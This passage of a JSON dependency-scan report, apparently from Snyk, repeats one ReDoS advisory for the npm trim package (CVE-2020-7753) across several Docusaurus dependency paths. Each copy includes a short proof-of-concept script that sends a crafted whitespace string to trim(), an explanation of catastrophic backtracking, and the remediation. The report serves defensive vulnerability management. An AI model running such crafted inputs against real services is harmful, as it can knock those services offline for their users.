      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-blog@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-search-algolia@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-docs@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "packagePopularityRank": 99,
      "from": [
        "code-gpt-docs@davila7/code-gpt-docs#0605e6515c3f97e1c4eb775aadb0121b4f12b993",
        "@docusaurus/preset-classic@2.2.0",
        "@docusaurus/theme-classic@2.2.0",
        "@docusaurus/theme-common@2.2.0",
        "@docusaurus/plugin-content-pages@2.2.0",
        "@docusaurus/mdx-loader@2.2.0",
        "@mdx-js/mdx@1.6.22",
        "remark-mdx@1.6.22",
        "remark-parse@8.0.3",
        "trim@0.0.1"
      ],
      "upgradePath": [
        false,
        false,
        false,
        false,
        false,
        false,
        "@mdx-js/mdx@2.0.0",
        "remark-mdx@2.0.0"
      ],
      "version": "0.0.1",
      "name": "trim",
      "isUpgradable": false,
      "isPatchable": false,
      "isPinnable": false
    },
    {
      "id": "SNYK-JS-TRIM-1017038",
      "title": "Regular Expression Denial of Service (ReDoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
      "credit": [
        "Liyuan Chen"
      ],
      "semver": {
        "vulnerable": [
          "<0.0.3"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [
        "0.0.3"
      ],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "js",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "trim",
      "references": [
        {
          "url": "https://github.com/component/trim/pull/8",
          "title": "GitHub PR"
        },
        {
          "url": "https://github.com/component/trim/blob/master/index.js%23L6",
          "title": "Vulnerable Code"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-06-22T11:01:33.385085Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-04-27T01:10:40.520960Z"
        }
      ],
      "description": "## Overview\n[trim](https://www.npmjs.com/package/trim) is a Trim string whitespace\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `trim()` method. \r\n\r\n## PoC by Liyuan Chen: \r\n```js\r\nvar trim = require(\"trim\")\r\n\r\nfunction build_attack (n) {\r\nvar ret = \"1\"\r\nfor (var i = 0; i < n; i++) {\r\nret += \" \"\r\n}\r\n\r\nreturn ret + \"1\";\r\n}\r\nvar time = Date.now();\r\ntrim(build_attack(50000))\r\nvar time_cost = Date.now() - time;\r\nconsole.log(\"time_cost: \" + time_cost)\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `trim` to version 0.0.3 or higher.\n## References\n- [GitHub PR](https://github.com/component/trim/pull/8)\n- [Vulnerable Code](https://github.com/component/trim/blob/master/index.js#L6)\n",
      "epssDetails": {
        "percentile": "0.76131",
        "probability": "0.00632",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2020-7753"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-w5p7-h5w8-2hfq"
        ]
      },
      "packageName": "trim",
      "proprietary": true,
      "creationTime": "2020-10-11T10:28:41.769555Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2020-10-11T10:24:13Z",
      "packageManager": "npm",
      "publicationTime": "2020-10-27T15:51:30Z",
      "modificationTime": "2023-06-22T11:01:33.385085Z",
